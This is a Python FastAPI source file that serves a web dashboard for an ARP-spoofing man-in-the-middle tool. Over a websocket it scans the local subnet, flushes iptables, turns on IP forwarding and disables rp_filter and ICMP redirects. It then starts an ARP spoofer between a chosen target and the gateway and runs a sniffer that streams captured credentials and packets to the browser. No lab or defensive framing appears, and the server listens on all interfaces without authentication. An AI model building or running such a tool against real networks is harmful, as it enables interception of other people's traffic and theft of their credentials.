from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import asyncio
import os
import json
import subprocess
import re

from core.network import NetworkScanner
from core.mitm import ARPSpoofer
from core.sniffer import SnifferEngine

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")

# Global States
scanner_engine = None
mitm_engine = None
sniffer_engine = None
selected_interface = "eth0"

def get_interfaces():
    try:
        result = subprocess.run(["ip", "link"], capture_output=True, text=True)
        interfaces = re.findall(r"\d+: (\w+):", result.stdout)
        return interfaces if interfaces else ["eth0"]
    except Exception:
        return ["eth0"]

def get_subnet(interface):
    try:
        result = subprocess.run(["ip", "route", "list", "dev", interface], capture_output=True, text=True)
        match = re.search(r"(\d+\.\d+\.\d+\.\d+/\d+)", result.stdout)
        return match.group(1) if match else "192.168.1.0/24"
    except Exception:
        return "192.168.1.0/24"

def get_gateway():
    try:
        result = subprocess.run(["ip", "route"], capture_output=True, text=True)
        match = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", result.stdout)
        return match.group(1) if match else None
    except Exception:
        return None

class ConnectionManager:
    def __init__(self):
        self.active_connections = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()
loop = None

@app.on_event("startup")
async def startup_event():
    global loop
    loop = asyncio.get_running_loop()

def on_log_callback(message):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "log", "message": message}), loop)

def on_host_callback(hosts):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "hosts", "data": hosts}), loop)

def on_credential_callback(creds):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "credential", "data": creds}), loop)

def on_traffic_callback(rx, tx):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "traffic", "rx": rx, "tx": tx}), loop)

def on_packet_callback(pkt_data):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "packet", "data": pkt_data}), loop)

@app.get("/api/interfaces")
async def api_interfaces():
    return {"interfaces": get_interfaces(), "current": selected_interface}

@app.get("/")
async def get():
    with open(os.path.join("static", "index.html"), "r") as f:
        return HTMLResponse(content=f.read())

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    global scanner_engine, mitm_engine, sniffer_engine, selected_interface
    await manager.connect(websocket)
    
    try:
        while True:
            data = await websocket.receive_text()
            msg = json.loads(data)
            
            if msg["action"] == "set_interface":
                iface = msg["interface"]
                if iface == selected_interface: continue
                
                if scanner_engine: scanner_engine.stop(); scanner_engine = None
                if mitm_engine: mitm_engine.stop(); mitm_engine = None
                if sniffer_engine: sniffer_engine.stop(); sniffer_engine = None
                
                selected_interface = iface
                on_log_callback(f"[*] Interface switched to {selected_interface}")
                
            elif msg["action"] == "start_scan":
                if not scanner_engine or not scanner_engine.running:
                    scanner_engine = NetworkScanner(selected_interface, on_log_callback, on_host_callback)
                    subnet = get_subnet(selected_interface)
                    scanner_engine.start(subnet)
                    
            elif msg["action"] == "stop_scan":
                if scanner_engine:
                    scanner_engine.stop()
                    scanner_engine = None

            elif msg["action"] == "start_mitm":
                target_ip = msg["target_ip"]
                target_mac = msg.get("target_mac", "Unknown_MAC")
                gateway = get_gateway()
                
                if not gateway:
                    on_log_callback("[-] Could not find default gateway! Aborting.")
                    continue

                subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL)
                subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL)
                subprocess.run(["iptables", "-P", "FORWARD", "ACCEPT"], stdout=subprocess.DEVNULL)
                
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
                
                subprocess.run(["sysctl", "-w", "net.ipv4.conf.all.send_redirects=0"], stdout=subprocess.DEVNULL)
                subprocess.run(["sysctl", "-w", "net.ipv4.conf.default.send_redirects=0"], stdout=subprocess.DEVNULL)
                subprocess.run(["sysctl", "-w", f"net.ipv4.conf.{selected_interface}.send_redirects=0"], stdout=subprocess.DEVNULL)
                
                subprocess.run(["sysctl", "-w", "net.ipv4.conf.all.rp_filter=0"], stdout=subprocess.DEVNULL)
                subprocess.run(["sysctl", "-w", "net.ipv4.conf.default.rp_filter=0"], stdout=subprocess.DEVNULL)
                subprocess.run(["sysctl", "-w", f"net.ipv4.conf.{selected_interface}.rp_filter=0"], stdout=subprocess.DEVNULL)
                
                on_log_callback("[*] Transparent Bridge enabled. Rules cleaned. rp_filter disabled.")
                
                sniffer_engine = SnifferEngine(
                    selected_interface, target_ip, target_mac, 
                    on_log_callback, on_credential_callback, on_traffic_callback, on_packet_callback
                )
                sniffer_engine.start()
                
                mitm_engine = ARPSpoofer(selected_interface, target_ip, gateway, target_mac, on_log_callback)
                mitm_engine.start()

            elif msg["action"] == "stop_mitm":
                if mitm_engine:
                    mitm_engine.stop()
                    mitm_engine = None
                
                if sniffer_engine:
                    sniffer_engine.stop()
                    sniffer_engine = None

                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.DEVNULL)
                
                subprocess.run(["sysctl", "-w", "net.ipv4.conf.all.send_redirects=1"], stdout=subprocess.DEVNULL)
                subprocess.run(["sysctl", "-w", "net.ipv4.conf.default.send_redirects=1"], stdout=subprocess.DEVNULL)
                subprocess.run(["sysctl", "-w", f"net.ipv4.conf.{selected_interface}.send_redirects=1"], stdout=subprocess.DEVNULL)
                
                subprocess.run(["sysctl", "-w", "net.ipv4.conf.all.rp_filter=1"], stdout=subprocess.DEVNULL)
                subprocess.run(["sysctl", "-w", "net.ipv4.conf.default.rp_filter=1"], stdout=subprocess.DEVNULL)
                subprocess.run(["sysctl", "-w", f"net.ipv4.conf.{selected_interface}.rp_filter=1"], stdout=subprocess.DEVNULL)
                
                on_log_callback("[*] Network restored to default settings.")

    except WebSocketDisconnect:
        manager.disconnect(websocket)

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=9000, reload=False)
